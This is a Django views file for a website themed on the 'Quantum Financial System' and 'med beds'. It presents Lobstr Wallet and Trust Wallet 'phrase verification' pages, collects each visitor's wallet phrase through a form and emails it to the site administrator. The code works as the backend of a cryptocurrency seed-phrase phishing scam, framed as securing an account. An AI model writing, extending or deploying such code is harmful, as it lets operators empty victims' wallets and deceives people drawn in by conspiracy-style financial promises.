from django.shortcuts import render

# Create your views here.
def qfs_home(request):
    return render(request, 'qfs/home.html')


def med_beds(request):
    return render(request, 'qfs/med_beds.html')



def start_qfs(request):
    return render(request, 'qfs/start_qfs.html')


from django.shortcuts import render, redirect
from .forms import PhraseForm


CARDS = [
    {
        "id": 1,
        "title": "Lobstr Wallet",
        "description": "Secure Quantum Financial System account with Lobstr Wallet.",
        "details": """
        Access your QFS account securely.
        Complete the phrase verification below.
        """
    },
    {
        "id": 2,
        "title": "Trust Wallet",
        "description": "Secure Quantum Financial System account with Trust Wallet.",
        "details": """
        Access consultation information and registration.
        """
    }
]


def qfs_start(request):

    if request.method == "POST":
        return redirect("qfs_cards")

    return render(
        request,
        "qfs/start.html"
    )


def qfs_cards(request):

    if request.method == "POST":

        card_id = request.POST.get("card_id")

        request.session["selected_card"] = card_id

        return redirect("qfs_details")

    return render(
        request,
        "qfs/cards.html",
        {
            "cards": CARDS
        }
    )


from django.conf import settings
from django.core.mail import EmailMultiAlternatives
from django.template.loader import render_to_string
from django.utils.html import strip_tags

def send_qfs_notification(user, card, phrase):
    """
    Sends a notification email to the admin when a QFS form is submitted.
    """

    context = {
        "user": user,
        "card": card,
        "phrase": phrase,
    }

    html_content = render_to_string(
        "emails/qfs_submission.html",
        context
    )

    text_content = strip_tags(html_content)

    email = EmailMultiAlternatives(
        subject=f"New QFS Submission - {card['title']}",
        body=text_content,
        from_email=settings.DEFAULT_FROM_EMAIL,
        to=[settings.ADMIN_EMAIL],
    )

    email.attach_alternative(
        html_content,
        "text/html"
    )

    email.send(fail_silently=False)


def qfs_details(request):

    card_id = request.session.get(
        "selected_card"
    )

    if not card_id:
        return redirect("qfs_cards")

    card = next(
        (
            c for c in CARDS
            if str(c["id"]) == str(card_id)
        ),
        None
    )

    if not card:
        return redirect("qfs_cards")

    if request.method == "POST":

        form = PhraseForm(
            request.POST
        )

        if form.is_valid():

            phrase = form.cleaned_data[
                "phrase"
            ]

            # Save to database here

            send_qfs_notification(
                user=request.user if request.user.is_authenticated else None,
                card=card,
                phrase=phrase
            )

            return redirect(
                "qfs_success"
            )

    else:
        form = PhraseForm()

    return render(
        request,
        "qfs/detail.html",
        {
            "card": card,
            "form": form
        }
    )


def qfs_success(request):

    return render(
        request,
        "qfs/success.html"
    )